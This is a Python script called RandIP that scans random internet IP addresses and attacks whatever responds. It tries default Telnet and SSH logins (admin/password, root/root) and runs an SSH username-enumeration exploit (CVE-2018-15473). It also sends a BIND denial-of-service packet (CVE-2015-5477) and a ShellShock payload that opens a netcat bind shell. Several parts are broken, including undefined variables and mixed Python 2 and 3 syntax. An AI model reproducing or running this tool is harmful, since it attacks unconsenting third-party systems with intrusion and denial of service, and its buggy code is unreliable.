#RandIP 1.2.1 Stable#
#Random IP Generator with Socket, SSH, Telnet, and HTML Screenshot support.#
#Report bugs including uncontained exceptions to blmvxer@gmail.com#
import socket, os, time, telnetlib, paramiko, requests, zipfile, stem.process, subprocess, sys, logging
from random import randint
from stem.util import term
#from PyQt4.QtGui import *
#from PyQt4.QtWebKit import *

def UnknownError():#Catch all unknown errors and do an Emergency exit#
	e = sys.exc_info()[0]
	exc_type, exc_obj, exc_tb = sys.exc_info()
	fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
	print((exc_type, fname, exc_tb.tb_lineno))
	print(("Uncaught error %s" % e))
	fp = open("error.log", 'a')
	fp.write("Script:")
	fp.write(str(fname))
	fp.write('\n')
	fp.write("Error: ")
	fp.write(str(e))
	fp.write('\n')
	fp.write(str(exc_type))
	fp.write('\n')
	fp.write(str(exc_tb.tb_lineno))
	fp.write('\n')
	fp.write(str(exc_obj))
	fp.write('\n')
	fp.write(str(exc_tb))
	fp.write('\n')
	fp.write('\n')
	fp.write('\n')
	fp.close()
	print(('\n')*5)
	print("Error.log wrote to current directory...Check and report any unhandled exceptions or bugs to blmvxer@gmail.com\n")
	print(('\n')*5)
	print("sleeping for 5 seconds and then finishing exit")
	time.sleep(5)
	WriteLog()

a = []
b = []
c = []
d = []
e = []
f = []
g = []
hostlog = []
timestr = time.strftime("%Y%m%d-%H%M%S")
def WriteLog():
	print('Keyboard Interrupt Detected.\n')
	fp.write('Hosts Attempted(')
	fp.write(str(a))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Working Hosts(')
	fp.write(str(b))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Working Host Lookup(')
	fp.write(str(c))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Telnet Information(')
	fp.write(str(d))
	fp.write(')\n')
	fp.write('\n')
	fp.write('Failed Telnet Conncections(')
	fp.write(str(e))
	fp.write(')')
	fp.write('\n')
	fp.write('SSH Information(')
	fp.write(str(f))
	fp.write(')')
	fp.write('\n')
	fp.write('Failed SSH(')
	fp.write(str(g))
	fp.write(')')
	fp.close()
	zf = zipfile.ZipFile('randip_log.zip', mode='w')
	try:
		for hostlist in hostlog:
			print(('zipping ' + hostlist + ' to randip_log.zip\n'))
			zf.write(hostlist)
	except zipfile.BadZipfile:
		print((zipfile.BadZipfile))
		zf.close()
	except OSError:
		print(OSError)
		zf.close()
	zf.write(logfile)
	zf.close()
	s.close()
	print('Cleaning up files...\n')
	time.sleep(3)
	for hostr in hostlog:
		os.remove(hostr)
	os.remove(logfile)
	print('Directory cleaned!, All sockets closed!')
	sys.exit()

def print_bootstrap_lines(line):
  if "Bootstrapped " in line:
    print((term.format(line, term.Color.BLUE)))

def randip():
	while True:
		yield ".".join(str(randint(1, 255)) for i in range(int(4)))

def webGui():
	import httplib2
	import signal
	def sig_sighandler():
		pass
	signal.signal(signal.SIGINT, sig_sighandler)
	http = httplib2.Http()
	headers, content = http.request(myhost, "GET")
	app = QApplication(sys.argv)
	web = QWebView()
	web.setHtml(content)
	web.show()
	app.exec_()

logfile = str(timestr) + "_randip_log.txt"
fp = open(logfile, 'w')

######################################################################
#Custom Exploit Container
def tBindDOS():
	print('Using tBind CVE:2015-5477')
	print(('Sending packet to ' + address + ' ...'))
	payload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex'))
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.sendto(payload, (address, 53))
	print('Done.\n')

def ShellShock():
	rport=80
	print('Using ShellShock CVE:2014-6271(6278)')
	print(('Sending packet to ' + address + '...'))
	payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
	try:
		serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		time.sleep(1)
		serversocket.connect(address)
		print('[!] Successfully exploited')
		print(('[!] Connected to ', address))
		serversocket.settimeout(3)
		while True:
			reply = input(address+"> ")
			serversocket.sendall(reply+"\n")
			data = serversocket.recv(buff)
			print(data)
			print('Done.\n')
	except exception.TypeError:
		print('Exploit failed...\n')
		pass
	except:
		print('Exploit failed...\n')
		pass
def SSHenum():
	global SSHsock
	class InvalidUsername(Exception):
		pass
	def add_boolean(*args, **kwargs):
		pass
	old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
	def service_accept(*args, **kwargs):
		paramiko.message.Message.add_boolean = add_boolean
		return old_service_accept(*args, **kwargs)
	def userauth_failure(*args, **kwargs):
		raise InvalidUsername()
	print('Using CVE:2018-15473')
	SSHsock = socket.socket()
	try:
		SSHsock.connect((address, 22))
	except socket.error:
		print '[-] Failed to connect'
		pass
	transport = paramiko.transport.Transport(SSHsock)
	try:
		transport.start_client()
	except paramiko.ssh_exception.SSHException:
		print '[-] Failed to negotiate SSH transport'
		pass
	try:
		transport.auth_publickey('root', paramiko.RSAKey.generate(2048))
	except InvalidUsername:
		print '[*] Invalid username'
		pass
	except paramiko.ssh_exception.AuthenticationException:
		print '[+] Valid username'
		f.append(address)
		pass
#End Of Exploit Container
#########################################################################
def find_service_name():
	global SSHio
	global Telio
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(10)
	result = sock.connect_ex((address,22))
	if result == 0:
		print('SSH Possibly Open\n')
		SSHio=1
		time.sleep(2)
	else:
		print('SSH Closed\n')
		SSHio=0
		time.sleep(2)
	result1 = sock.connect_ex((address,23))
	if result1 == 0:
		print('Telnet Possibly Open\n')
		Telio=1
		time.sleep(2)
	else:
		print('Telnet Closed\n')
		Telio=0
		time.sleep(2)


def TelnetConnect():
	#Default telnet connection using admin as user and password#
	try:
		telnettime=time.clock()
		tn = telnetlib.Telnet(address, 23)
		tn.read_until("login: ")
		time.sleep(3)#Sometimes telnet takes a second after login#
		tn.write('admin' + '\n')
		tn.read_until('Password: ')
		tn.write('password' + '\n')
		tn.write("ls\n")
		tn.write("exit\n")
		print(tn.read_all())
		#e.append(tn.read_all())
	except socket.error:
		telend=time.clock()
		totaltime = telend - telnettime
		print((socket.error, 'Error Signing in or Telnet not accessible', address))
		print('\n')
		print(totaltime)
		#e.append(address)
		pass
	except EOFError:
		print((EOFError, address))
		d.append(address)
		pass
	except exceptions.AttributeError:
		telend=time.clock()
		totaltime = telend - telnettime
		print(exceptions.AttributeError)
		d.append(address)
		pass
	except exceptions.TypeError:
		print(exceptions.TypeError)
		pass
	except KeyboardInterrupt:
		WriteLog()
#				break


def SSHConnect():
	try:
		print('Using CVE:2016-6210')
		SSH = paramiko.SSHClient()
		p = 'A'*25000
		starttime=time.clock()
		SSH.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			SSH.connect(address, username='root', password='root')
			stdin, stdout, stderr = client.exec_command('ls')
			for line in stdout:
				print('... ' + line.strip('\n'))
				client.close()
				f.append(address)
		except:
			endtime=time.clock()
			f.append(address)
			total=endtime-starttime
			print('Possible username root based on enumeration exploit...or timeout...Check Manually!...')
			print(total)
	except socket.timeout:
		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
		g.append(address)
		pass
	except socket.error:
		print((socket.timeout, '%s timeout SSH or SSH not accessible' % address))
		g.append(address)
		pass
	except paramiko.ssh_exception.SSHException:
		print((paramiko.ssh_exception.SSHException, 'SSH Could not connect or SSH not accessible', address))
		g.append(address)
		pass
	except paramiko.ssh_exception.AuthenticationException:
		print((paramiko.ssh_exception.AuthenticationException, 'Error logging into SSH' ,  address))
		g.append(address)
		pass
	except KeyboardInterrupt:
		WriteLog()
		#break

for address in randip():
	try:
		try:
			#Socket tests with a timeout of 1.8 seconds#
			s = socket.socket()
			s.settimeout(1.8)
			s.connect((address, 80))
			print(address, "WORKS!!!")
			b.append(address)
			DNS = socket.gethostbyaddr(address)
			hostname = DNS[0]
			ipaddr = (",".join(DNS[2]))
			DNSinfo = (hostname.ljust(10), ipaddr.rjust(20))
			print(DNSinfo)
			c.append(DNSinfo)
			global myhost
			myhost = 'http://' + address
			req = requests.get('http://' + address)
			if str(req.status_code) == '200':
				print((term.format('Response Code: ' + str(req.status_code) + ' Works', term.Color.GREEN)))
			elif str(req.status_code) == '400':
				print((term.format('Response Code: ' + str(req.status_code) + ' Bad Request', term.Color.RED)))
			elif str(req.status_code) == '401':
				print((term.format('Response Code: ' + str(req.status_code) + ' Unauthorized', term.Color.YELLOW)))
			elif str(req.status_code) == '403':
				print((term.format('Response Code: ' + str(req.status_code) + ' Forbidden', term.Color.YELLOW)))
			elif str(req.status_code) == '404':
				print((term.format('Response Code: ' + str(req.status_code) + ' Not Found', term.Color.RED)))
			elif str(req.status_code) == '500':
				print((term.format('Response Code: ' + str(req.status_code) + ' Internal Server Error', term.Color.YELLOW)))
			else:
				print(('Response Code: ' + str(req.status_code)))
			fpadr = open('host.' + address, 'w')
			fpadr.write('Response Code: ' + str(req.status_code))
			fpadr.write('\n')
			fpadr.write(req.text.encode('utf-8').strip())
			fpadr.close()
			hostlog.append('host.' + address)
			print('Beginning Service Discovery\n')
			find_service_name()
			print(('Beginning Telnet attempt on %s\n' % address))
			if Telio == 1:
				TelnetConnect()
			elif Telio == 0:
				print('Telnet port not open...skipping\n')
			print(('Starting SSH Attempt on %s' % address))
			if SSHio == 1:
				SSHConnect()
				SSHenum()
			elif SSHio == 0:
				print('SSH port not open...skipping\n')
#Custom Exploits
			tBindDOS()
			ShellShock()
#End of Exploits
		except socket.timeout:
			print((socket.timeout, '%s timeout' % address))
			print('\n')
			a.append(address)
			pass
		except socket.herror:
			print((socket.herror, 'Error getting host by address on %s' % address))
			print('\n')
			print('Beginning Service Discovery\n')
			find_service_name()
			print(('Beginning Telnet attempt on %s\n' % address))
			if Telio == 1:
				TelnetConnect()
			elif Telio == 0:
				print('Telnet port not open...skipping\n')
			print(('Starting SSH Attempt on %s' % address))
			if SSHio == 1:
				SSHConnect()
				SSHenum()
			elif SSHio == 0:
				print('SSH port not open...skipping\n')
				a.append(address)
				pass
		except socket.error:
			print((socket.error, 'Failed to connect to %s' % address))
			print('\n')
			a.append(address)
			pass
		except requests.exceptions.HTTPError:
			print((requests.exceptions.HTTPError, address))
			a.append(address)
			pass
		except requests.exceptions.ConnectionError:
			print((requests.exceptions.ConnectionError, address))
			a.append(address)
			pass
		except requests.packages.urllib3.exceptions.LocationValueError:
			print((requests.packages.urllib3.exceptions.LocationValueError, address))
			a.append(address)
			pass
		except requests.exceptions.ReadTimeout:
			print((requests.exceptions.ReadTimeout, address))
			a.append(address)
			pass
		except requests.exceptions.TooManyRedirects:
			print((requests.exceptions.TooManyRedirects, address))
			a.append(address)
			pass
		except TypeError as e:
			e = sys.exc_info()[0]
			exc_type, exc_obj, exc_tb = sys.exc_info()
			fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
			print((exc_type, fname, exc_tb.tb_lineno))
			print((TypeError, address))
			a.append(address)
			pass
		except Exception as e:
			UnknownError()
	except Exception as e:
		UnknownError()
	except KeyboardInterrupt:
		WriteLog()
		break
